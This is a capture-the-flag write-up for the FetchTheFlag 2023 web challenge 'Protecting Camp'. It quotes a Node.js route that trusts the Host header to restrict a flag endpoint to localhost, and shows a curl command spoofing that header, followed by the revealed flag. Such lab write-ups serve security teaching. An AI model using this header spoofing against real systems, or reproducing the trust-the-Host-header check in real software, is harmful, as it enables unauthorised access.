---
title: FetchTheFlag CTF 2023-Web-ProtectingCamp
date: 2023-10-28 
categories: [Writeups, FetchTheFlag CTF 2023]
tags: [CTF,Web,ReqHeader,easy]
---

# Protecting Camp - Easy
## Description
<sup>Author: @soups71</sup><br>

I made a small site to keep a list of things I need to buy to keep me safe before I go camping, maybe it's keeping some other things safe too!

Psst... Snyk can help solve this challenge! Try it out!

Press the Start button in the top right to begin this challenge.<br>
Connect with:<br>
	`http://challenge.ctf.games:31777`<br>
**Attachments:** [protecting_camp.zip](https://github.com/0xSirawit/Fetch-the-Flag-CTF-2023/blob/main/assets/files/protecting_camp.zip)
## Solution
`index.js` inside `protecting_camp.zip`
```js
app.get('/api/flag',  (req, res) => {
    var url = req.protocol + '://' + req.get('host') + req.originalUrl;
    try{
        parsed = parseUrl(url)
        if (parsed.resource != '127.0.0.1'){
            res.send("Hey... what's going on here\n");
        }else{
            fs.readFile("./flag.txt", 'utf8', (err, data) => {
                if (err) {
                    res.send("There was an error and this is sad :(\n")
            
                }else{
                    res.send(data+"\n")
                }
            });
    }} catch (error) {
        res.status(400).json({ success: false, message: 'Error parsing URL' });
    }   
});
```
If I request `/api/flag`. I get this response.
```bash
$ curl http://challenge.ctf.games:31777/api/flag     
Hey... what's going on here
```
So I need to trick a website that the request comes from localhost according to `if (parsed.resource != '127.0.0.1')`.
```bash
$ curl -H 'HOST: 127.0.0.1' http://challenge.ctf.games:31777/api/flag
flag{d716dd8ab70bbc51a5f1d0182c84bcc8}
```

> Flag: flag{d716dd8ab70bbc51a5f1d0182c84bcc8}
{: .prompt-tip }